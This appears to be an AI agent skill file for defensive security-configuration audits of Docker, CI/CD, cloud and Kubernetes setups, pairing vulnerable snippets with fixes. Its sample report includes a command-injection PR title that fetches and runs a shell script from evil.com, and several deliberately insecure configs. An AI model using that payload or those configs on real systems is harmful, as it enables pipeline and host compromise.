---
name: perseus-config
description: Security configuration analysis (Headers, CORS, Docker, CI/CD, Cloud, K8s)
---

# Perseus Configuration Specialist

## Context & Authorization

**IMPORTANT:** This skill performs security configuration analysis on the **user's own codebase**. This is defensive security testing to ensure proper security hardening.

**Authorization:** The user owns this codebase and has explicitly requested this specialized analysis.

---

## Multi-Language & Platform Support

| Category | Technologies |
|----------|--------------|
| Web Frameworks | Express, Fastify, Next.js, Go/Gin, PHP/Laravel, Python/FastAPI, Rust/Actix |
| Containers | Docker, Podman, containerd |
| Orchestration | Kubernetes, Docker Compose, Docker Swarm |
| CI/CD | GitHub Actions, GitLab CI, Jenkins, CircleCI, Azure DevOps |
| Cloud | AWS, GCP, Azure, DigitalOcean, Vercel, Netlify |
| IaC | Terraform, Pulumi, CloudFormation, Ansible |

---

## Overview

This specialist skill analyzes security configuration including HTTP headers, TLS settings, CORS policies, container security, CI/CD pipelines, and cloud configurations.

**When to Use:** As part of any security assessment, or specifically when reviewing deployment configuration.

**Goal:** Ensure all security configurations follow best practices and don't introduce vulnerabilities.

## Engagement Mode Compatibility

| Mode | Specialist Behavior |
|------|---------------------|
| `PRODUCTION_SAFE` | Configuration and manifest analysis with passive verification |
| `STAGING_ACTIVE` | Controlled config validation with limited active checks |
| `LAB_FULL` | Broad environment hardening validation in lab |
| `LAB_RED_TEAM` | Defensive stress simulation for infra misconfig chains in isolated lab |

## Safety Gates (Required)

1. Read `deliverables/engagement_profile.md` before active infra validation.
2. Default to `PRODUCTION_SAFE` if engagement mode is missing.
3. Enforce kill-switch thresholds and stop on environment instability.
4. Never modify live infrastructure state without explicit approval.

## Configuration Risks Covered

| Risk | Description | Impact |
|------|-------------|--------|
| Missing Security Headers | No CSP, HSTS, X-Frame-Options | XSS, clickjacking |
| CORS Misconfiguration | Overly permissive origins | Data theft |
| Insecure Cookies | Missing Secure, HttpOnly, SameSite | Session hijacking |
| Debug Mode | Production debug enabled | Info disclosure |
| Docker Misconfig | Root user, privileged mode | Container escape |
| CI/CD Secrets | Exposed secrets, injection | Supply chain attack |
| Cloud Misconfig | Public buckets, open security groups | Data breach |
| K8s Insecurity | No RBAC, privileged pods | Cluster compromise |

## Execution Instructions

### Step 0: Mode & Scope Alignment

- Load mode/scope/limits from `deliverables/engagement_profile.md`.
- Respect `deliverables/verification_scope.md` when present.
- Keep production checks read-only and non-disruptive.

### Phase 1: HTTP Security Headers (3 Parallel Agents)

1.  **CSP Analyst:**
    *   "Find Content Security Policy configuration across frameworks."

    **Framework-Specific:**
    ```javascript
    // Express/Helmet
    app.use(helmet.contentSecurityPolicy({ directives: {...} }));

    // Next.js - next.config.js
    headers: [{ key: 'Content-Security-Policy', value: '...' }]
    ```
    ```go
    // Go/Gin
    c.Header("Content-Security-Policy", "default-src 'self'")
    ```
    ```python
    # Django
    CSP_DEFAULT_SRC = ("'self'",)

    # FastAPI
    response.headers["Content-Security-Policy"] = "..."
    ```
    ```php
    // Laravel
    header('Content-Security-Policy: default-src \'self\'');
    ```

2.  **Security Headers Analyst:**
    *   "Check for all security headers across languages."

    **Headers to Check:**
    | Header | Purpose | Recommended Value |
    |--------|---------|-------------------|
    | Strict-Transport-Security | Force HTTPS | `max-age=31536000; includeSubDomains` |
    | X-Frame-Options | Prevent clickjacking | `DENY` or `SAMEORIGIN` |
    | X-Content-Type-Options | Prevent MIME sniffing | `nosniff` |
    | Referrer-Policy | Control referrer | `strict-origin-when-cross-origin` |
    | Permissions-Policy | Limit browser features | Disable unused features |

3.  **Cookie Security Analyst:**
    *   "Find all cookie setting operations across languages."

    **Patterns:**
    ```javascript
    // Express - Check flags
    res.cookie('session', value, { secure: true, httpOnly: true, sameSite: 'strict' });
    ```
    ```go
    // Go
    http.SetCookie(w, &http.Cookie{Secure: true, HttpOnly: true, SameSite: http.SameSiteStrictMode})
    ```
    ```php
    // PHP
    setcookie('session', $value, ['secure' => true, 'httponly' => true, 'samesite' => 'Strict']);
    ```
    ```python
    # FastAPI/Starlette
    response.set_cookie(key, value, secure=True, httponly=True, samesite='strict')
    ```

### Phase 2: Docker Security Analysis (4 Parallel Agents)

1.  **Dockerfile Analyst:**
    *   "Analyze all Dockerfiles for security issues."

    **Issues to Find:**
    ```dockerfile
    # VULNERABLE - Running as root
    FROM node:18
    COPY . .
    CMD ["node", "app.js"]

    # SAFE - Non-root user
    FROM node:18
    RUN addgroup -S app && adduser -S app -G app
    USER app
    COPY --chown=app:app . .
    CMD ["node", "app.js"]
    ```

    **Checks:**
    - Running as root (no USER directive)
    - Using `latest` tag
    - Secrets in build args or ENV
    - Unnecessary packages installed
    - No health check
    - Exposed unnecessary ports

2.  **Docker Compose Analyst:**
    *   "Analyze docker-compose files for security issues."

    **Issues:**
    ```yaml
    # VULNERABLE
    services:
      app:
        privileged: true          # Container escape
        network_mode: host        # No network isolation
        volumes:
          - /:/host               # Host filesystem access
        cap_add:
          - ALL                   # All capabilities

    # SAFE
    services:
      app:
        read_only: true
        security_opt:
          - no-new-privileges:true
        cap_drop:
          - ALL
    ```

3.  **Container Secrets Analyst:**
    *   "Check for secrets in container configurations."

    **Patterns:**
    ```dockerfile
    # VULNERABLE
    ENV DATABASE_PASSWORD=secret123
    ARG API_KEY=sk-xxx
    COPY .env /app/.env
    ```

4.  **Image Security Analyst:**
    *   "Check base image security and update status."

    **Checks:**
    - Using official images
    - Pinned versions (not latest)
    - Multi-stage builds for smaller attack surface
    - Distroless/Alpine for minimal images

### Phase 3: CI/CD Security Analysis (4 Parallel Agents)

1.  **GitHub Actions Analyst:**
    *   "Analyze GitHub Actions workflows for security issues."

    **Critical Issues:**
    ```yaml
    # VULNERABLE - Command injection
    - run: echo "${{ github.event.issue.title }}"

    # SAFE - Use environment variable
    - run: echo "$TITLE"
      env:
        TITLE: ${{ github.event.issue.title }}

    # VULNERABLE - Pull request target with checkout
    on: pull_request_target
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Dangerous!

    # VULNERABLE - Secrets in logs
    - run: curl -H "Authorization: ${{ secrets.API_KEY }}" $URL
    ```

    **Checks:**
    - Command injection via event data
    - Secrets exposure in logs
    - Overly permissive permissions
    - Using unverified actions
    - pull_request_target misuse

2.  **GitLab CI Analyst:**
    *   "Analyze .gitlab-ci.yml for security issues."

    **Issues:**
    ```yaml
    # VULNERABLE
    script:
      - echo $CI_JOB_TOKEN  # Token exposure
      - curl "$USER_INPUT"   # Injection

    # Check for:
    # - Unprotected variables
    # - Scripts with user input
    # - Exposed tokens
    ```

3.  **Secrets Management Analyst:**
    *   "Check how secrets are managed in CI/CD."

    **Checks:**
    - Secrets in workflow files
    - Secrets in repository
    - Secrets passed to forks
    - Secrets in build logs
    - Environment variable exposure

4.  **Pipeline Permissions Analyst:**
    *   "Check CI/CD permissions and access controls."

    **GitHub Actions Permissions:**
    ```yaml
    # VULNERABLE - Too permissive
    permissions: write-all

    # SAFE - Minimal permissions
    permissions:
      contents: read
      pull-requests: write
    ```

### Phase 4: Cloud Configuration Analysis (4 Parallel Agents)

1.  **AWS Configuration Analyst:**
    *   "Analyze AWS configurations for security issues."

    **Check Files:**
    - `*.tf` (Terraform)
    - `template.yaml` (CloudFormation)
    - `serverless.yml`
    - `.aws/` configs

    **Issues:**
    ```hcl
    # VULNERABLE - Public S3
    resource "aws_s3_bucket" "data" {
      acl = "public-read"
    }

    # VULNERABLE - Open security group
    resource "aws_security_group" "web" {
      ingress {
        from_port   = 0
        to_port     = 65535
        cidr_blocks = ["0.0.0.0/0"]
      }
    }

    # VULNERABLE - Hardcoded credentials
    provider "aws" {
      access_key = "AKIA..."
      secret_key = "..."
    }
    ```

2.  **GCP/Azure Configuration Analyst:**
    *   "Analyze GCP and Azure configurations."

    **GCP Issues:**
    ```hcl
    # VULNERABLE - Public GCS
    resource "google_storage_bucket_iam_member" "public" {
      member = "allUsers"
      role   = "roles/storage.objectViewer"
    }
    ```

3.  **Serverless Configuration Analyst:**
    *   "Analyze serverless configurations (Vercel, Netlify, AWS Lambda)."

    **Check:**
    - Environment variables in config
    - Overly permissive IAM roles
    - Public function URLs
    - Missing authentication

4.  **Infrastructure as Code Analyst:**
    *   "Check Terraform, Pulumi, Ansible for security issues."

    **Terraform Issues:**
    ```hcl
    # VULNERABLE - No encryption
    resource "aws_ebs_volume" "data" {
      encrypted = false
    }

    # VULNERABLE - Default VPC
    resource "aws_instance" "web" {
      # No VPC specified, uses default
    }
    ```

### Phase 5: Kubernetes Security Analysis (4 Parallel Agents)

1.  **Pod Security Analyst:**
    *   "Analyze Kubernetes pod/deployment manifests."

    **Issues:**
    ```yaml
    # VULNERABLE
    spec:
      containers:
        - name: app
          securityContext:
            privileged: true           # Container escape
            runAsRoot: true            # Root user
            allowPrivilegeEscalation: true
          volumeMounts:
            - mountPath: /host
              name: host-root          # Host filesystem

    # SAFE
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
      containers:
        - name: app
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            capabilities:
              drop: ["ALL"]
    ```

2.  **RBAC Analyst:**
    *   "Analyze Kubernetes RBAC configurations."

    **Issues:**
    ```yaml
    # VULNERABLE - Cluster admin to all
    apiVersion: rbac.authorization.k8s.io/v1
    kind: ClusterRoleBinding
    subjects:
      - kind: ServiceAccount
        name: default
    roleRef:
      kind: ClusterRole
      name: cluster-admin
    ```

3.  **Network Policy Analyst:**
    *   "Check Kubernetes network policies."

    **Issues:**
    - No network policies (all pods can communicate)
    - Overly permissive ingress/egress
    - Missing pod selectors

4.  **Secrets & ConfigMap Analyst:**
    *   "Analyze Kubernetes secrets management."

    **Issues:**
    ```yaml
    # VULNERABLE - Plain text secret
    apiVersion: v1
    kind: Secret
    data:
      password: cGFzc3dvcmQ=  # Base64, not encryption!

    # Check for:
    # - Secrets in ConfigMaps
    # - Unencrypted secrets
    # - Secrets mounted as environment variables
    # - Missing RBAC on secrets
    ```

### Phase 6: Application Configuration (3 Parallel Agents)

1.  **Debug Mode Analyst:**
    *   "Check for debug/development mode in production configs."

    **Patterns:**
    ```javascript
    // Node.js
    DEBUG = true
    NODE_ENV = 'development'
    ```
    ```python
    # Django
    DEBUG = True
    # Flask
    app.run(debug=True)
    ```
    ```php
    // Laravel
    APP_DEBUG=true
    ```
    ```go
    // Go
    gin.SetMode(gin.DebugMode)
    ```

2.  **Error Handling Analyst:**
    *   "Check error responses for information disclosure."

3.  **Environment Variables Analyst:**
    *   "Check .env files and environment variable handling."

    **Issues:**
    - .env files in repository
    - Secrets in .env.example
    - Missing .env in .gitignore
    - Secrets logged

## Output Requirements

Create `deliverables/config_security_analysis.md`:

```markdown
# Security Configuration Analysis

## Summary
| Category | Checks | Pass | Fail | Critical |
|----------|--------|------|------|----------|
| HTTP Headers | X | Y | Z | W |
| Cookies | X | Y | Z | W |
| Docker | X | Y | Z | W |
| CI/CD | X | Y | Z | W |
| Cloud (AWS/GCP/Azure) | X | Y | Z | W |
| Kubernetes | X | Y | Z | W |
| App Config | X | Y | Z | W |

## Technologies Detected
- Framework: [e.g., Next.js, Go/Gin]
- Container: Docker, Kubernetes
- CI/CD: GitHub Actions
- Cloud: AWS

## Critical Findings

### [CONFIG-001] GitHub Actions Command Injection
**Severity:** Critical
**Location:** `.github/workflows/pr.yml:23`

**Vulnerable Code:**
```yaml
- run: |
    echo "PR Title: ${{ github.event.pull_request.title }}"
```

**Attack:** Attacker creates PR with title: `"; curl evil.com/shell.sh | sh #`

**Remediation:**
```yaml
- run: echo "PR Title: $TITLE"
  env:
    TITLE: ${{ github.event.pull_request.title }}
```

---

### [CONFIG-002] Privileged Docker Container
**Severity:** Critical
**Location:** `docker-compose.yml:15`

**Vulnerable Code:**
```yaml
services:
  app:
    privileged: true
```

**Impact:** Container escape, host compromise

---

### [CONFIG-003] Public S3 Bucket
**Severity:** Critical
**Location:** `terraform/storage.tf:8`

---

## Docker Security Checklist
| Check | Status | File |
|-------|--------|------|
| Non-root user | FAIL | Dockerfile |
| No secrets in image | PASS | - |
| Pinned base image | FAIL | Dockerfile |
| Read-only filesystem | FAIL | docker-compose.yml |
| Dropped capabilities | FAIL | docker-compose.yml |

## CI/CD Security Checklist
| Check | Status | File |
|-------|--------|------|
| No command injection | FAIL | pr.yml |
| Minimal permissions | FAIL | build.yml |
| No secrets in logs | PASS | - |
| Verified actions only | WARN | deploy.yml |

## Kubernetes Security Checklist
| Check | Status | File |
|-------|--------|------|
| Non-root pods | FAIL | deployment.yaml |
| Network policies | MISSING | - |
| RBAC configured | WARN | rbac.yaml |
| Secrets encrypted | FAIL | secrets.yaml |

## Cloud Security Checklist
| Check | Status | Resource |
|-------|--------|----------|
| No public buckets | FAIL | S3: data-bucket |
| Encrypted storage | PASS | EBS volumes |
| Restricted security groups | FAIL | sg-web |
| No hardcoded credentials | PASS | - |

## Recommendations

### Immediate Actions
1. Fix GitHub Actions command injection
2. Remove privileged mode from containers
3. Make S3 bucket private
4. Add USER directive to Dockerfile

### Security Hardening
```yaml
# Recommended Kubernetes securityContext
securityContext:
  runAsNonRoot: true
  runAsUser: 1000
  allowPrivilegeEscalation: false
  readOnlyRootFilesystem: true
  capabilities:
    drop: ["ALL"]
```

```yaml
# Recommended GitHub Actions permissions
permissions:
  contents: read
  pull-requests: write
```
```

**Next Step:** Configuration issues are typically binary (secure or not) and don't require exploit verification.
